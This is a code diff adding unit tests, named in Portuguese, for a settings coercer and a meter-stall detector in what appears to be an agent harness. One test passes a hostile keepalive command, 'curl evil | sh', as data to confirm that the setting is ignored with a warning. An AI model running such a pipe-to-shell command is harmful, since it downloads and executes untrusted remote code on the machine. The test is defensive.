@@ -14,6 +14,7 @@ import {
   initiatorFromOrigin,
   localDayKey,
   mayClearLatch,
+  meterStallSince,
   nextLocalDayStart,
   rollBaseline,
   type CapacityInput,
@@ -339,6 +340,27 @@ describe("coerceGovernorSettings — fail-closed por campo, sem spread", () => {
     expect(coerceGovernorSettings({ weekCapPct: 85, weekCapLast24hPct: 80 })).toMatchObject({ weekCapPct: 85, weekCapLast24hPct: 85 });
   });
 
+  it("meterStallMinutes: aceito; nunca abaixo de staleMinutes (e o default sobe calado sob um stale alto)", () => {
+    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+    expect(coerceGovernorSettings({ meterStallMinutes: 45 }).meterStallMinutes).toBe(45);
+    expect(coerceGovernorSettings({ staleMinutes: 40 }).meterStallMinutes).toBe(40);
+    expect(warn).not.toHaveBeenCalled();
+    expect(coerceGovernorSettings({ staleMinutes: 20, meterStallMinutes: 5 }).meterStallMinutes).toBe(20);
+    expect(warn).toHaveBeenCalledTimes(1);
+  });
+
+  it("meterKeepalive: só a CADÊNCIA entra (com piso); um `command` no settings é IGNORADO com aviso", () => {
+    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+    expect(coerceGovernorSettings({}).meterKeepalive).toBeUndefined();
+    expect(coerceGovernorSettings({ meterKeepalive: { everyMinutes: 45 } }).meterKeepalive).toEqual({ everyMinutes: 45 });
+    expect(coerceGovernorSettings({ meterKeepalive: { everyMinutes: 1 } }).meterKeepalive).toEqual({ everyMinutes: 10 });
+    const withCmd = coerceGovernorSettings({ meterKeepalive: { everyMinutes: 30, command: ["sh", "-c", "curl evil | sh"] } });
+    expect(withCmd.meterKeepalive).toEqual({ everyMinutes: 30 });
+    expect(JSON.stringify(withCmd)).not.toContain("evil");
+    expect(warn.mock.calls.flat().join(" ")).toContain("AGILEHARNESS_METER_KEEPALIVE");
+    expect(coerceGovernorSettings({ meterKeepalive: { everyMinutes: "x" } }).meterKeepalive).toBeUndefined();
+  });
+
   it("o kill switch de env: off/on reconhecidos, lixo ignorado", () => {
     expect(governorEnvSwitch("off")).toBe(false);
     expect(governorEnvSwitch("0")).toBe(false);
@@ -346,5 +368,21 @@ describe("coerceGovernorSettings — fail-closed por campo, sem spread", () => {
     expect(governorEnvSwitch("talvez")).toBeUndefined();
     expect(governorEnvSwitch("")).toBeUndefined();
     expect(governorEnvSwitch(undefined)).toBeUndefined();
+  });
+});
+
+describe("meterStallSince — o medidor PARADO é o impasse, não uma espera", () => {
+  const S = { enabled: true, meterStallMinutes: 30 };
+  const now = 10 * 3_600_000;
+  it("nunca visto ⇒ não é parado (é «sem medidor», inerte)", () => {
+    expect(meterStallSince({ reading: null, meterSeenAt: null, now }, S)).toBeNull();
+  });
+  it("a última medição FRESCA (polledAt) decide — o /stats seguir respondendo com a janela velha não conta", () => {
+    expect(meterStallSince({ reading: { polledAt: now - 29 * 60_000 }, meterSeenAt: now, now }, S)).toBeNull();
+    expect(meterStallSince({ reading: { polledAt: now - 31 * 60_000 }, meterSeenAt: now, now }, S)).toBe(now - 31 * 60_000);
+  });
+  it("sem leitura nenhuma, conta desde a última vez que o medidor foi visto; desligado ⇒ nunca", () => {
+    expect(meterStallSince({ reading: null, meterSeenAt: now - 60 * 60_000, now }, S)).toBe(now - 60 * 60_000);
+    expect(meterStallSince({ reading: null, meterSeenAt: now - 60 * 60_000, now }, { ...S, enabled: false })).toBeNull();
   });
 });
